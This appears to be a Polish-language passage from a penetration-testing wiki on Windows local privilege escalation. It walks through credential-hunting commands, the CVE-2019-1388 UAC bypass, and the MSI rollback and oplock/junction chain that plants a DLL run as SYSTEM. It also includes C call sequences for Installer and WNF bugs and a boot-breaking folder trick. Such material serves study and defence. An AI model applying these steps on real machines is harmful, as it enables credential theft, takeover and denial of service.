**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcje za pośrednictwem jednego lub większej liczby interfejsów, identyfikowanych za pomocą identyfikatorów interfejsów (IID).

Klasy i interfejsy COM są zdefiniowane w rejestrze odpowiednio pod kluczami **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W kluczach CLSID tego rejestru można znaleźć podklucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na plik **DLL** oraz wartość o nazwie **ThreadingModel**, której wartością może być **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątków).

![Historia przeglądania — COM DLL Overwriting: W kluczach CLSID tego rejestru można znaleźć podklucz InProcServer32, który zawiera wartość domyślną wskazującą na plik DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolne biblioteki DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli taka biblioteka DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak osoby atakujące wykorzystują COM Hijacking jako mechanizm utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Wyszukaj w rejestrze nazwy kluczy i hasła**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**, który stworzyłem, aby **automatycznie uruchamiać każdy moduł POST metasploit wyszukujący dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do pozyskiwania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** zapisane jawnym tekstem przez różne narzędzia (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu nadrzędnego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz pobrać **otwarty uchwyt do procesu uprzywilejowanego utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, który dokładniej wyjaśnia, jak testować i nadużywać większej liczby otwartych uchwytów do procesów i wątków, dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, określane jako **pipes**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet za pośrednictwem różnych sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **named pipe server** i **named pipe client**.

Gdy **klient** wysyła dane przez pipe, **serwer**, który go skonfigurował, może **przyjąć tożsamość** **klienta**, jeśli ma wymagane uprawnienia **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz podszyć, stwarza możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez Ciebie pipe. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie umożliwia również **przechwytywanie komunikacji przez named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie umożliwia wyświetlanie listy wszystkich pipes, aby znaleźć privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zamienić `ClientAttach` w dowolny **zapis 4 bajtów** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- Wywołaj `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której masz prawo zapisu → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację line za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz zdarzenia przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj i zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / nadużycie ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlers (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

Po uzyskaniu shella jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kradzież haseł z procesów

## Od użytkownika z niskimi uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach Microsoft Windows można uruchomić terminal lub inny proces jako „NT\AUTHORITY SYSTEM”, korzystając z konta użytkownika bez uprawnień.

Pozwala to jednocześnie eskalować uprawnienia i ominąć UAC, wykorzystując tę samą lukę. Nie trzeba też niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez Microsoft.

Niektóre z podatnych systemów to:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w tym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Medium administratora do High / obejście UAC

Przeczytaj to, aby **dowiedzieć się więcej o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się więcej o UAC i metodach jego obejścia:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Przekierowanie katalogów przesyłania do katalogu udostępnianego przez serwer WWW za pomocą junction

Aplikacja może tworzyć przewidywalny podkatalog przesyłania, zapisywać w nim plik pod nazwą podaną przez użytkownika, a następnie przetwarzać ten plik. Jeśli użytkownik z niskimi uprawnieniami może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to specyficzna dla aplikacji granica umożliwiająca dowolny zapis — sam fakt, że katalog przesyłania jest zapisywalny lub że istnieje w nim junction, nie stanowi dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment jego wykonania w procedurze obsługi przesyłania, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne listy ACL miejsca docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w tym miejscu docelowym. Osobno potwierdź tożsamość procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać listy ACL katalogów i metadane reparse point, ale nie pozwala ustalić zachowania procedury obsługi ani przyszłej podmiany junction. Jeśli wykonanie odbywa się w kontekście konta usługi, sprawdź **rzeczywisty token procesu**, zanim rozważysz odrębną ścieżkę wykorzystującą uprawnienia tokenu.

## Czyszczenie przez uprzywilejowane zadanie harmonogramu wyzwalane przez WNF

Zadanie harmonogramu, które blokuje ręczne uruchamianie, może mimo to udostępniać wyzwalacz dostępny dla użytkownika bez uprawnień. Podczas audytu uprzywilejowanego zadania wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, podmiot i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli uprawnienia do tego zabezpieczonego stanu zezwalają bieżącemu użytkownikowi na opublikowanie aktualizacji, użytkownik może pośrednio uruchomić zadanie z skonfigurowaną dla niego tożsamością, mimo ustawienia `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, akceptowało aktualizacje stanu WNF `7508BCA32C079E41` od zwykłego użytkownika, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall był wyłączony.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby sprawdzić osiągalność, pobierz adres `ZwUpdateWnfStateData` z `ntdll.dll`, wyślij pustą aktualizację dla ośmiobajtowej nazwy stanu i porównaj zwrócony status z danymi o ostatnim uruchomieniu zadania lub aktywnością w Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcanie rekursywnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem nie jest samo wyzwolenie operacji, lecz uprzywilejowana procedura czyszczenia, która przyjmuje kontrolowany przez atakującego katalog. Prześledź operację od enumeracji do końcowej modyfikacji: wykrywanie profili/sesji, wybieranie elementów podrzędnych za pomocą symboli wieloznacznych, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne oznaki, że wcześniej sprawdzona ścieżka zostanie później przejrzana rekursywnie. Jeśli elementy potomne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz wyzwalacz WNF z opisanym poniżej [podstawieniem oplock, junction i dowiązania symbolicznego Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje program czyszczący po wybraniu przez niego prawidłowego elementu podrzędnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, dzięki czemu po wznowieniu uprzywilejowane usuwanie rozwiązuje ścieżkę przez `\RPC Control` do chronionego celu. W łańcuchu Recall doprowadziło to do usunięcia `C:\Config.Msi` przez SYSTEM, wymaganego przez udokumentowaną technikę rollbacku MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy potomne omijają płytkie poprawki dotyczące punktów ponownej analizy

Weryfikacja wyłącznie katalogu kontrolowanego przez atakującego i jego bezpośredniego elementu podrzędnego nie zabezpiecza rekursywnego usuwania opartego na ścieżce. Pozostaw te sprawdzone obiekty bez zmian, a podstawienie junction/oplock przenieś do dodatkowego elementu podrzędnego poniżej nich; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu potomnego i podąży za jego nowym celem. CVE-2026-20941 powstało właśnie w wyniku takiej niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiła dotychczasową operację rekursywnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwieraniu **każdego elementu potomnego** względem już zaufanego uchwytu katalogu, pobraniu i zweryfikowaniu końcowej rozstrzygniętej ścieżki/obiektu oraz zastosowaniu dyspozycji usunięcia do zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a potem nie wracaj do rekursywnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdzaj również struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja działania programu wykazała, że `OBJECT_ATTRIBUTES` w `NtCreateFile` miało niepusty `RootDirectory` i względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilacji sugerujący istnienie drugiego prymitywu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), z kodem exploit [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji rollbacku Windows Installer do zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików rollbacku podczas odinstalowywania innych pakietów MSI; pliki rollbacku zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi `msiexec.exe` działającej jako SYSTEM za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem vtable `0xA0`, `SetEEUIDirectoryAndFilter` pod `0xC8` i `CleanupTempPackages` pod `0x50`. Te nazwy i offsety ustalono w wyniku inżynierii wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod wywołującego wyłącznie podczas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. To potwierdza, że wywołujący może usunąć katalog, i zapobiega podążaniu za punktem ponownej analizy, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` funkcja `SetEEUIDirectoryAndFilter` oznacza ścieżkę jako folder, niezależnie od argumentu filtru podanego przez wywołującego. Usługa zapisuje wartość `REG_DWORD` o określonej nazwie w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwą wartości jest kontrolowana przez wywołującego ścieżka, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia czyszczenie. Działający z podwyższonymi uprawnieniami proces roboczy enumeruje wartości rejestru i przekazuje wpisy folderów do rekursywnej funkcji `FDeleteFolder` bez sprawdzania pochodzenia ścieżek. Jeśli zwykłe usuwanie się nie powiedzie, kod wywołuje również `LockdownPath`, usuwa atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll` wygląda następująco:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie junction. Zarejestruj utworzony przez atakującego katalog `C:\Config.Msi`, usuń go i pozwól Windows Installer później utworzyć ponownie tę samą ścieżkę z chronionymi danymi wycofywania. Podczas czyszczenia system ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. To omija zamierzoną granicę ochrony zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do opisanego poniżej łańcucha rollback: zachowaj osobny wpis `Installer\Folders`, usuń chroniony katalog `C:\Config.Msi`, utwórz go ponownie z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC` otwarty przed zaostrzeniem DACL przez instalator. Wcześniej otwarty uchwyt może przywrócić pobłażliwą DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić, zanim rollback zostanie wznowiony.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa bramka funkcji. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zainstaluj aktualizacje zabezpieczeń Windows z kwietnia 2025 r., zamiast uznawać pomyślny wynik metody za test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowana technika wygląda następująco:

1. **Etap 1 – Przygotowanie do przejęcia (pozostaw pusty katalog `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby **użytkownik bez uprawnień administratora** mógł go uruchomić.
    - Pozostaw otwarty **uchwyt** do pliku po instalacji.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe do rollback).
    - **Sprawdzaj otwarty uchwyt** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik zmieni ścieżkę na `C:\Config.Msi\<random>.rbf`.

- Krok 3: Własna synchronizacja
    - Plik `.msi` zawiera **własną akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje, że plik `.rbf` został zapisany.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **wykorzystaj podatność umożliwiającą usunięcie dowolnego folderu z uprawnieniami SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Zastąpienie skryptów rollback złośliwymi**

- Krok 6: Utwórz ponownie `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie utwórz ponownie folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która wymusza błąd.
    - Ta instalacja posłuży do ponownego wywołania **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **własną akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia `rbs created`:
        - Windows Installer **ponownie stosuje silne ACL** do `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie zastosować słabe ACL**.

> ACL są **egzekwowane tylko przy otwieraniu uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp zawartość pliku `.rbs` **fałszywym skryptem rollback**, który instruuje Windows, aby:
        - Przywrócił twój plik `.rbf` (złośliwy DLL) do **lokalizacji uprzywilejowanej** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający z uprawnieniami SYSTEM**.

- Krok 12: Wywołaj rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - Skonfigurowano **własną akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w ustalonym momencie.
    - To powoduje **rozpoczęcie rollback**.

- Krok 13: SYSTEM instaluje twój DLL
    - Windows Installer:
        - Odczytuje twój złośliwy plik `.rbs`.
        - Kopiuje twój DLL z pliku `.rbf` do docelowej lokalizacji.
    - Twój **złośliwy DLL znajduje się teraz w ścieżce, z której ładuje go SYSTEM**.

- Ostatni krok: Uruchom kod z uprawnieniami SYSTEM
    - Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), który załaduje przejęty DLL.
    - **Gotowe**: twój kod zostaje uruchomiony **jako SYSTEM**.


### Od usuwania/przenoszenia/zmiany nazwy dowolnego pliku do SYSTEM EoP

Główna technika MSI rollback (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli twoja podatność pozwala jedynie na **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** katalogu.

Dlatego jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** katalogu, NTFS **usuwa cały katalog** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API do usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do eskalacji uprawnień do SYSTEM
Co, jeśli Twój prymityw nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje uruchomiony** i przekazuje kontrolę do Twojego callbacku.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Dzięki temu `folder1` zostanie opróżniony bez zwalniania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplocka.

- Opcja B: Zamień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Atak ten jest wymierzony w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj primitive, który pozwala **utworzyć dowolny folder jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz ją wcześniej jako folder**, Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widzi folder, **nie może znaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje rozruch**.
- **Nie ma mechanizmu awaryjnego** ani **możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i symlinków OM do nadpisania dowolnego pliku / DoS podczas rozruchu

